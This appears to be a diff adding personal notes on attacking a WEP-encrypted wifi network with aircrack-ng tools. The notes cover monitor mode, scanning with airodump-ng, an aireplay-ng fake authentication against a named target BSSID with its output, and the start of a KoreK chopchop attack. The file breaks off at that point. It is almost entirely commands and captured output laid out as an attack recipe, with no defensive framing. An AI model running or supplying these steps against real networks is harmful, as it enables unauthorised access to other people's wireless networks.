@@ -1,0 +1,53 @@
+--------------------------------------------------------------------------------------------------------------------
+//Put Wifi Card into Monitor Mode
+--------------------------------------------------------------------------------------------------------------------
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor 
+ifconfig wlan0 up
+
+--------------------------------------------------------------------------------------------------------------------
+//Scan The Networks Around Us with airodump
+--------------------------------------------------------------------------------------------------------------------
+airodump-ng wlan0
+
+OutPut -> 
+
+CH 11 ][ Elapsed: 24 s ][ 2018-06-10 06:49                                         
+                                                                                                                                                    
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                    
+ 6C:72:20:7A:4B:7F  -26       17        0    0   1  54e  WEP  WEP         Hulk Smash                                                                
+                                                                                                                                                    
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                          
+                                                                                                                                                    
+---------------------------------------------------------------------------------------------------------------------
+//Fake Authentecation 
+---------------------------------------------------------------------------------------------------------------------
+
+ [Program]   [option] [times]       [Target Mac]                  [Wifi Card Mac]    [Interface]
+
+aireplay-ng  --fakeauth  0             -a 6C:72:20:7A:4B:7F     -h fe:e5:96:73:1e:9d     wlan0
+
+OutPut -> 
+
+06:56:11  Waiting for beacon frame (BSSID: 6C:72:20:7A:4B:7F) on channel 1
+
+06:56:11  Sending Authentication Request (Open System) [ACK]
+06:56:11  Authentication successful
+06:56:11  Sending Association Request [ACK]
+06:56:11  Association successful :-) (AID: 1)
+
+
+Results of Fake Authentecation
+
+BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                                     
+                                                                                                                                                    
+6C:72:20:7A:4B:7F  -30      369        2    0   1  54e  WEP  WEP   { OPN } Hulk Smash                                                                
+
+-------------------------------------------------------------------------------------------------------------------------
+//Koreck ChopChop Attack
+-------------------------------------------------------------------------------------------------------------------------
+[Program]    [option       [Target Mac]                  [Wifi Card Mac]         [Interface]
+aireplay-ng   --chopchop     -a 6C:72:20:7A:4B:7F          -h C6:0D:9C:AC:08:31    wlan0
+aireplay-ng   --chopchop     -a 6C:72:20:7A:4B:7F          -h 26:c1:26:c7:ec:71    wlan0
+
